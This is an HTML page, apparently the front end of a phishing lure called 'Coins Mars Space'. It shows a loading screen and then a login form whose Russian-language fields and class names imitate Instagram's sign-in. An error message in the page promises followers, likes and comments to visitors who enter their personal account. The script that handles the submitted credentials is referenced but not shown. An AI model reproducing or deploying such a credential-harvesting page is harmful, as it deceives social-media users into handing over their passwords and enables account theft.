<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Coins Mars Space</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="./style.css">
</head>
<body class="bg-[url('https://c4.wallpaperflare.com/wallpaper/54/119/802/technology-instagram-social-media-hd-wallpaper-preview.jpg')] h-screen bg-cover bg-bottom justify-center flex items-center"> 
    
<div class="loading">
    <p>
        Loading.......
    </p>
    <div class="loading-line">
        <div class="loading-line-gray"></div>
        <div class="loading-line-white"></div>
    </div>
</div>

<div id="login" class="hidden bg-slate-800 max-w-[340px] w-full rounded-lg shadow-2xl text-white shadow-violet-700 text-center">
    <form action="" class="flex flex-col gap-5 shadow-inner shadow-violet-700 w-full h-full items-center justify-center py-10 px-20 rounded-lg">
        <p>Authorization</p>
        <input placeholder="Телефон, имя пользователя или эл. адрес" aria-label="Телефон, имя пользователя или эл. адрес" aria-required="true" autocapitalize="off" autocorrect="off" maxlength="75" class="_aa4b _add6 _ac4d _ap35 py-3 shadow-inner shadow-violet-900 rounded-lg text-black" dir="" type="text" value="" name="username">
        <input placeholder="Пароль" aria-label="Пароль" aria-required="true" autocapitalize="off" autocorrect="off" class="_aa4b _add6 _ac4d _ap35 py-2 shadow-inner shadow-violet-900 rounded-lg text-black" type="password" value="" name="password">
        <button id="loginBtn" class="py-2 min-w-[215px] bg-violet-600 px-20 rounded-lg shadow-inne shadow-violet-400 font-bold">Вход</button>
    </form>
</div>

<div id="errorMessage" class="hidden bg-red-500 text-white text-center py-2 px-4 rounded-md shadow-lg absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2">
    Вы должны были вводить ваш личный аккаунт. Если вы неправильно ввели или же допустили ошибку не наша вина. Мы отправим вам что вы хотели (подписчики, лайки, коменты).
</div>

<script src="./main.js"></script>
</body>
</html>
